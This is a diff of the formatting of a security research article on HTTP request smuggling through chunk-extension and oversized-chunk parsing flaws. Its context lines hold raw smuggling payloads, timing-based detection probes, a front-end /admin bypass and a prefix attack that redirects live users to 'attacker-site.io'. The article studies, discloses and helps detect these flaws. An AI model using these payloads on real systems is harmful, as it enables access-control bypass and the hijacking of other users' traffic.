@@ -117,14 +117,20 @@ We begin our journey in a strange and largely forgotten corner of the HTTP/1.1 R
 > __7.1.1. Chunk Extensions__  
 >  
 > The chunked coding allows each chunk to include zero or more chunk extensions, immediately following the chunk-size, for the sake of supplying per-chunk metadata (such as a signature or hash), mid-message control information, or randomization of message body size.  
->  
-> <span style="display: block;">chunk-ext = *( BWS ";" BWS chunk-ext-name</span><span style="display: block; margin-left: 105px;">[ BWS "=" BWS chunk-ext-val ] )</span>  
-> <span style="display: block;">chunk-ext-name = token</span><span style="display: block;">chunk-ext-val = token / quoted-string</span>
+>
+> ```
+>  chunk-ext      = *( BWS ";" BWS chunk-ext-name
+>                      [ BWS "=" BWS chunk-ext-val ] )
+>
+>  chunk-ext-name = token
+>  chunk-ext-val  = token / quoted-string
+> ```
 
 Chunk extensions are an optional feature for HTTP messages using [chunked transfer encoding](https://en.wikipedia.org/wiki/Chunked_transfer_encoding). Before we move on to discuss chunk extensions further, let us first briefly remind ourselves of the syntax of chunked-encoding HTTP messages.
 
 Chunked transfer encoding is signaled by the `Transfer-Encoding: chunked` header. In such messages, the body is divided into *chunks*, each consisting of what we may refer to as a *chunk header* and a *chunk body*, both of which are terminated by a CRLF sequence. The chunk header consists of a hexadecimal number specifying the chunk size, optionally followed by any number of semicolon-separated chunk extensions. The chunk body contains the actual data being delivered, its length indicated by the header. The message ends when a zero-sized chunk is encountered.
 
+<div style="max-width: 100%; overflow-x: auto;">
 <div style="margin: auto; width: 420px;">
 <pre><code>POST /some/path HTTP/1.1<span class="http-line-break">\r\n</span>
 Host: example.com<span class="http-line-break">\r\n</span>
@@ -138,6 +144,7 @@ Transfer-Encoding: chunked<span class="http-line-break">\r\n</span>
 </span><span class="http-highlight http-highlight-three"><span class="http-highlight-head http-highlight-three-compl">0<span class="http-line-break">\r\n</span><span class="http-highlight-text">last chunk</span>
 </span><span class="http-line-break">\r\n</span>
 </span></code></pre>
+</div>
 </div>
 
 Using these optional chunk extensions, a sender can attach metadata to each individual chunk they send. This is exemplified in the request above in which the metadata `foo=bar` is attached to the second chunk. To be clear, these chunk parameters are __not__ the data delivered to the web application – they're metainformation meant for the server processing the request.
@@ -191,7 +198,8 @@ An interesting thing to note is that these vulnerabilities fundamentally differ 
 #### TERM.EXT
 Let us first take a look at a simple TERM.EXT request smuggling payload. Below, both interpretations are shown using highlights to display the perceived chunk boundaries.
 
-<div style="display: flex; gap: 10px;">
+<div style="max-width: 100%; overflow-x: auto;">
+<div style="display: flex; gap: 10px; min-width: 700px;">
 <div style="flex: 1;">
 
 <pre><code>GET /one HTTP/1.1<span class="http-line-break">\r\n</span><span class="http-highlight-text-req"><b>request #1</b></span>
@@ -236,6 +244,7 @@ Transfer-Encoding: chunked<span class="http-line-break">\r\n</span>
 <p style="text-align: center; font-weight: bold;">EXT interpretation (server)</p>
 </div>
 </div>
+</div>
 
 The key thing to notice in this request is of course the newline in the chunk extension which causes the parsing discrepancy. The proxy, interpreting the newline as a line terminator, will consider `45` the size of the second chunk, whereas the server will consider it the content of the first chunk. As such, a second pipelined request can be hidden in what the proxy perceives as the body of the second chunk.
 
@@ -245,7 +254,8 @@ The key thing to notice in this request is of course the newline in the chunk ex
 #### EXT.TERM
 The EXT.TERM variant has to my knowledge never been documented before, although it follows quite naturally from the TERM.EXT technique. Let us have a look at a payload equivalent to the TERM.EXT payload above.
 
-<div style="display: flex; gap: 10px;">
+<div style="max-width: 100%; overflow-x: auto;">
+<div style="display: flex; gap: 10px; min-width: 700px;">
 <div style="flex: 1;">
 
 <pre><code>GET /one HTTP/1.1<span class="http-line-break">\r\n</span><span class="http-highlight-text-req"><b>request #1</b></span>
@@ -288,6 +298,7 @@ Transfer-Encoding: chunked<span class="http-line-break">\r\n</span>
 <p style="text-align: center; font-weight: bold;">TERM interpretation (server)</p>
 </div>
 </div>
+</div>
 
 Much like in the TERM.EXT payload, the parsing discrepancy is introduced by the illegal `\n` in the chunk extension. The proxy ignores the sequence of 69 (0x45) A's in the perceived chunk extension, whereas the server considers it the content of the first chunk. The remaining data is therefore interpreted as the chunk body by the proxy, but as a pipelined request by the server.
 
@@ -298,11 +309,13 @@ At first glance, the obvious answer appears to be *no*, precisely because there 
 
 The trick is to use *oversized chunks* – that is, chunks with larger bodies than indicated in the chunk header. For example, consider the invalid chunked message body below:
 
+<div style="max-width: 100%; overflow-x: auto;">
 <pre><code>5<span class="http-line-break">\r\n</span>
 AAAAA<span class="http-highlight-one-compl" style="padding: 0 0px;">XXX</span><span class="http-line-break">\r\n</span>
 0<span class="http-line-break">\r\n</span>
 <span class="http-line-break">\r\n</span>
 </code></pre>
+</div>
 
 Some HTTP servers and proxies accept such malformed chunks and simply ignore the trailing excess bytes which I will henceforth refer to as the *spill*. By placing a sequence that one parser interprets as a line terminator in what another parser interprets as a spill, we obtain an exploitable parsing discrepancy. This allows us to define a new set of complementary vulnerabilities that to my knowledge has never before been documented.
 
@@ -311,7 +324,8 @@ Let us first consider the scenario in which the server accepts oversized chunk b
 
 In my experience, parsers are even more lenient regarding the CRLF after the chunk body. Since only the sequence `\r\n` is valid in this location, some parsers do not even bother to check it and just accept any 2-byte sequence. Here's an example payload effective against a proxy using such a parser.
 
-<div style="display: flex; gap: 10px;">
+<div style="max-width: 100%; overflow-x: auto;">
+<div style="display: flex; gap: 10px; min-width: 700px;">
 <div style="flex: 1;">
 
 <pre><code>GET /one HTTP/1.1<span class="http-line-break">\r\n</span><span class="http-highlight-text-req"><b>request #1</b></span>
@@ -356,6 +370,7 @@ Transfer-Encoding: chunked<span class="http-line-break">\r\n</span>
 <p style="text-align: center; font-weight: bold;">SPILL interpretation (server)</p>
 </div>
 </div>
+</div>
 
 On the front-end, the `XX` sequence is interpreted as a CRLF, and the subsequent `45` sequence is interpreted as the size of the next chunk. On the back-end, the entire `XX45` sequence is interpreted as spill bytes and thus ignored. Therefore, a second pipelined request can be hidden in what the proxy perceives as the body of the second chunk. 
 
@@ -363,7 +378,8 @@ On the front-end, the `XX` sequence is interpreted as a CRLF, and the subsequent
 #### SPILL.TERM
 In the opposite scenario, the proxy ignores spills in chunk bodies and we must find a sequence to place in a spill that only the server interprets as a line terminator. Let us this time suppose that a `\rX` sequence is ignored on the front-end but interpreted as a line terminator on the back-end.
 
-<div style="display: flex; gap: 10px;">
+<div style="max-width: 100%; overflow-x: auto;">
+<div style="display: flex; gap: 10px; min-width: 700px;">
 <div style="flex: 1;">
 
 <pre><code>GET /one HTTP/1.1<span class="http-line-break">\r\n</span><span class="http-highlight-text-req"><b>request #1</b></span>
@@ -410,6 +426,7 @@ Transfer-Encoding: chunked<span class="http-line-break">\r\n</span>
 <p style="text-align: center; font-weight: bold;">TERM interpretation (server)</p>
 </div>
 </div>
+</div>
 
 Here, the `\rX2` spill is ignored by the proxy, but interpreted as a CRLF followed by a chunk size of `2` on the back-end. Consequently, the `45` sequence is interpreted as a chunk size by the proxy, but as data by the back-end server, once again allowing a second request to be hidden from the proxy.
 
@@ -428,7 +445,8 @@ Vulnerable combinations of servers and proxies can quite easily be identified by
 
 In order to design such probes, we can adapt the [timeout-based detection methods](https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn#detect) developed by James Kettle in his 2019 request smuggling [research](https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn). The key idea here is to construct an HTTP request that will (1) cause a vulnerable front-end to drop the last portion of the request body and (2) cause a vulnerable back-end to hang if (and only if) some of the body doesn't arrive. This concept can quite easily be adapted to our little family of chunk parsing vulnerabilities.
 
-<div style="display: flex; gap: 10px;">
+<div style="max-width: 100%; overflow-x: auto;">
+<div style="display: flex; gap: 10px; min-width: 700px;">
 <div style="flex: 1;">
 <pre><code>POST / HTTP/1.1<span class="http-line-break">\r\n</span>
 Host: localhost<span class="http-line-break">\r\n</span>
@@ -441,7 +459,7 @@ xx<span class="http-line-break">\r\n</span>
 AAAABBBBCCCC<span class="http-line-break">\r\n</span>
 0<span class="http-line-break">\r\n</span>
 <span class="http-line-break">\r\n</span>
-<span class="http-highlight http-highlight-one">DDDDEEEEFFFF<span class="http-line-break">\r\n</span><span class="http-highlight-text">dropped by front-end</span>
+<span class="http-highlight http-highlight-one">DDDDEEEEFFFF<span class="http-line-break">\r\n</span><span style="white-space: nowrap;" class="http-highlight-text">dropped by front-end</span>
 0<span class="http-line-break">\r\n</span>
 <span class="http-line-break">\r\n</span>
 </span></code></pre>
@@ -467,6 +485,7 @@ AAAABBBBCCCC<span class="http-line-break">\r\n</span>
 <p style="text-align: center; font-weight: bold;">EXT.TERM probe</p>
 </div>
 </div>
+</div>
 
 In each of the example probes above, a proxy with the corresponding parsing flaw will interpret the first `0\r\n\r\n` sequence as the terminating zero-sized chunk, causing it to drop the part of the request marked in red. A vulnerable server receiving the request without the last part will expect more data to arrive, causing it to hang and eventually time out. This results in an easily identifiable time delay. 
 
@@ -482,6 +501,7 @@ As a smuggled request (by its very definition) is not interpreted as a request b
 
 Consider, for example, a front-end that restricts access to `/admin`. By exploiting a TERM.EXT vulnerability, we can circumvent this access control rule using a payload like the one below.
 
+<div style="max-width: 100%; overflow-x: auto;">
 <pre><code>GET / HTTP/1.1<span class="http-line-break">\r\n</span>
 Host: localhost<span class="http-line-break">\r\n</span>
 Transfer-Encoding: chunked<span class="http-line-break">\r\n</span>
@@ -498,13 +518,14 @@ Transfer-Encoding: chunked<span class="http-line-break">\r\n</span>
 0<span class="http-line-break">\r\n</span>
 <span class="http-line-break">\r\n</span> 
 </code></pre>
+</div>
 
 This simple payload, however, suffers from a major limitation. While the smuggled request *will* reach the back-end server, its response will not be returned to us. This is because the proxy believes it received only a single request, so it will usually not reply with two responses. 
 
 Fortunately, we can quite easily overcome this apparent blindness with a minor modification to the payload. We simply replace the `Transfer-Encoding` header with an oversized `Content-Length` header in the smuggled request and append a second pipelined request. When we make this change, we must also remember to update the chunk size accordingly.
 
-
-<div style="display: flex; gap: 10px;">
+<div style="max-width: 100%; overflow-x: auto;">
+<div style="display: flex; gap: 10px; min-width: 700px">
 <div style="flex: 1;">
 <pre><code><span class="http-highlight http-highlight-one">GET / HTTP/1.1<span class="http-line-break">\r\n</span><span class="http-highlight-text-req"><b>request #1</b></span>
 Host: localhost<span class="http-line-break">\r\n</span>
@@ -547,6 +568,7 @@ Host: localhost<span class="http-line-break">\r\n</span>
 <p style="text-align: center; font-weight: bold;">Server interpretation</p>
 </div>
 </div>
+</div>
 
 From the proxy's perspective, it is now receiving two pipelined requests, so it will happily return two responses. However, what the proxy considers to be the second pipelined request is in fact interpreted as the body of the smuggled request on the back-end. As such, we will obtain the response to the `GET /admin` request in the second response.
 
@@ -557,6 +579,7 @@ A very similar technique can be used to corrupt the requests sent by other live 
 
 This is particularly impactful if we have a way of eliciting a harmful response from the server. For example, an otherwise unexploitable header-based open redirect can be used to redirect random live users to a site of our choosing. If the application for instance responds with a `301 Redirect` with a `Location` header reflecting the value of the `X-Forwarded-Host` request header, live users of an EXT.TERM-vulnerable application could be redirected to `attacker-site.io` using the payload below.
 
+<div style="max-width: 100%; overflow-x: auto;">
 <pre><code>GET / HTTP/1.1<span class="http-line-break">\r\n</span>
 Host: localhost<span class="http-line-break">\r\n</span>
 Transfer-Encoding: chunked<span class="http-line-break">\r\n</span>
@@ -573,9 +596,13 @@ Content-Length: 100<span class="http-line-break">\r\n</span>
 0<span class="http-line-break">\r\n</span>
 <span class="http-line-break">\r\n</span>
 </code></pre>
+</div>
 
 Once the front-end forwards another request over the same back-end connection, the server will interpret it as the body of the smuggled request and respond accordingly, leading to the victim being served the malicious redirect. On the back-end, the request looks as shown below.
 
+<div style="max-width: 100%; overflow-x: auto;">
+<div style="display: flex; gap: 10px; min-width: 700px">
+<div style="flex: 1;">
 <pre><code>GET / HTTP/1.1<span class="http-line-break">\r\n</span>
 Host: localhost<span class="http-line-break">\r\n</span>
 X-Forwarded-Host: attacker-site.io<span class="http-line-break">\r\n</span>
@@ -587,6 +614,9 @@ Content-Length: 100<span class="http-line-break">\r\n</span>
 Host: localhost<span class="http-line-break">\r\n</span>
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)...<span class="http-line-break">\r\n</span>
 ...</span></code></pre>
+</div>
+</div>
+</div>
 
 Such prefixing-based attacks can be adapted in a large variety of ways to perform devastating attacks against live clients with zero user interaction. As these exploitation techniques are not unique to the kinds of request smuggling vulnerabilities we have introduced in this article, I will not discuss them at length here. For a more comprehensive review of such attacks, I recommend the Portswigger Web Security Academy's [article](https://portswigger.net/web-security/request-smuggling/exploiting) on the topic.
 
